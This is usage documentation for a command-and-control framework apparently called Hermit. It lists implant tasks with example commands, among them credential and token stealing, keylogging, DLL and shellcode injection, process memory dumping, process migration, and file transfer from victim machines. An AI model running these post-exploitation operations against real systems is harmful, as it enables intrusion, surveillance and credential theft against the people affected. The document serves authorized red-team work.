# Task

After C2 agents connected to listeners, we can send various tasks in Agent Mode.  
Before sending tasks, we need to switch to [Agent Mode](./agent-mode.md) at first.

Currently, the following tasks are available:

```txt
TASK:
  cat             Read contents of a file.
  cd              Change the working directory.
  connect         Change listener URL to connect.
  cp              Copy a file.
  creds steal     Steal credentials from various resources on the target computer
  dll             Load DLL and inject modules into the specified process
  download        Download a file.
  env ls          List environment variables.
  envs            alias for 'env ls'
  execute         Execute system command.
  group ls        List local groups.
  groups          Alias for 'group ls'
  history         Retrieve information from history files of applications
  ip              Print the network interface information on target computer
  jitter          Set jitter time (seconds) between requests from beacon
  keylog          Keylogging N seconds.
  kill            Terminate the current process.
  killdate        Change killdate (UTC) for the implant beacon.
  ls              List files in a directory.
  migrate         Migrate the implant into another process.
  mkdir           Create a new directory.
  mv              Move a file to a destination location.
  net             Get TCP connections.
  procdump        Dump process memory to a specified output file.
  ps kill         Terminate a process.
  ps ls           List processes.
  pwd             Print the current working directory.
  reg subkeys     Enumerate subkeys for the specified open registry key.
  reg values      Enumerate the specified registry values.
  rm              Remove a file.
  rmdir           Remove a directory.
  rportfwd add    Add settings to reverse port forwarding.
  rportfwd ls     List settings for reverse port forwarding.
  rportfwd rm     Stop and remove listener for reverse port forwarding.
  runas           Execute a program as another user.
  screenshot      Take a screenshot on target computer.
  shellcode       Inject shellcode into the specified process
  sleep           Set sleep time (seconds) between requests from beacon
  token revert    Revert back to the original process token.
  token steal     Steal token from the specified process and impersonate process.
  upload          Upload a file to the target computer.
  user ls         List users.
  users           List all local users.
  whoami          Print the current user information.
```

Most task commands are similar to system commands.  
For each usage, run `help <command>` or `help <command> <subcommand>` on Agent mode.

## `cat`

Prints contents of a file.

```sh
Hermit [agent-abcd] > cat example.txt
```

## `cd`

Changes current working directory.  
Please note that if you want to use a backslash (`\`) in the desination path, you need to add another backslash (`\\`) as below:

```sh
Hermit [agent-abcd] > cd "C:\\Program Files\\"
```

Or you can use a normal slash (`/`) instead of a backslash:

```sh
Hermit [agent-abcd] > cd "C:/Program Files/"
```

## `connect`

Changes the connected listener URL to new one.   
This is used when we want to change to another listener for communication.

```sh
Hermit [agent-abcd] > connect https://172.12.34.56:12345
```

## `cp`

Copies a file to destination path on a victim machine.  
We can specify an absolute path or a relative path.

```sh
Hermit [agent-abcd] > cp /tmp/example.txt ./example.txt
```

## `dll`

Injects DLL into specified process.

```sh
Hermit [agent-abcd] > dll --pid 1234 --dll /path/to/example.dll
```

To see running processes and check PIDs, use `ps ls` task.  

## `download`

Downloads a file from victim machine.

```sh
Hermit [agent-abcd] > download C:/Users/John/Desktop/example.txt /tmp/example.txt
```

## `env`

### `env ls`, `envs`

Lists environment variables in victim machine.

## `execute`

Executes system command in victim machine.

```sh
Hermit [agent-abcd] > execute notepad.exe
```

## `jitter`

Changes the Jitter time (N seconds).

```sh
Hermit [agent-abcd] > jitter 10
```

## `keylog`

Runs keylogger for N seconds.

```sh
# Keylogging for one minute.
Hermit [agent-abcd] > keylog 60
```

## `kill`

Terminates the implant process.  
**After running this task, the connection with the C2 agent will be terminated.**

## `killdate`

Changes the KillDate datetime.  
Specify in **UTC**. And the format is such like `2025-01-01 00:00:00`.

```sh
Hermit [agent-abcd] > killdate 2025-01-01 06:01:20
```

## `migrate`

Migrates the implant to another process.  
Specify the target process ID (PID).

```sh
Hermit [agent-abcd] > migrate 1234
```

To see running processes and PIDs, use `ps ls` task.

## `mv`

Move a file to specified place.

```sh
Hermit [agent-abcd] > mv ./example.txt C:/Users/John/Documents/example.txt
```

## `procdump`

Dump process memory and save it to dump file.  
Specify a target process ID (PID).

```sh
Hermit [agent-abcd] > procdump 1234
```

After dumping, the dump file is saved under `$HOME/.hermit/server/agents/agent-<name>/loot/procdumps` folder.  
To see running processes and PIDs, use `ps ls` task.

## `ps`

Manages processes.

### `ps kill`

Terminates a specified process.

```sh
Hermit [agent-abcd] > ps kill 1234
```

### `ps ls`

Lists all running processes.

## `reg`

Manages registy keys.

### `reg subkeys`

Lists regisry keys. To list recursively, add `-r` flag.

```sh
Hermit [agent-abcd] > reg subkeys HKLM\\SOFTWARE -r
```

### `reg values`

Prints registry values. To print recursively, add `-r` flag.

```sh
Hermit [agent-abcd] > reg values HKLM\\SOFTWARE\\Microsoft -r
```

## `runas`

Runs a command as another user.

```sh
Hermit [agent-abcd] > runas -u Administrator -p 'Password123' notepad.exe
```

## `screenshot`

Takes a screenshot and save it as PNG file.

```sh
Hermit [agent-abcd] > screenshot
```

After successful, the captured image file is saved under `$HOME/.hermit/server/agents/agent-<name>/loot/screenshots` folder.

## `shellcode`

Injects shellcode to specified process.

```sh
Hermit [agent-abcd] > shellcode --pid 1234 -s /path/to/shellcode.bin
```

To see running processes and PIDs, use `ps ls` task.

## `sleep`

Changes the Sleep time (N seconds).

```sh
Hermit [agent-abcd] > sleep 10
```

## `token`

Manages token.

### `token revert`

Reverts back to the original process token.

### `token steal`

Steal token from a specified process and impersonate.  
Please specify either `--process` or `--login` flag.

```sh
# --process: Execute process with stolen token.
Hermit [agent-abcd] > token steal --pid 1234 --process notepad.exe

# --login: Impersonate logged on.
Hermit [agent-abcd] > token steal --pid 1234 --login
```

## `upload`

Upload a file to victim machine.

```sh
Hermit [agent-abcd] > upload /tmp/example.txt C:/Users/John/Desktop/example.txt
```

## `user`

Manages users.

### `user ls`, `users`

Lists local users.

## `whoami`

Prints current user information on victim machine.  
To print the privileges, add `--priv` flag.

```sh
Hermit [agent-abcd] > whoami
```